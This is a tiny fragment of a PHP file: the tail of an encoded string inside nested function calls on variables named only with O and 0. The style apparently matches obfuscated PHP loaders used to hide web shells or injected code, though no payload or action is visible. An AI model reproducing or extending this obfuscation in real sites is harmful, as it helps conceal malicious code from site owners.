PMDAwMCksJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7"));
?>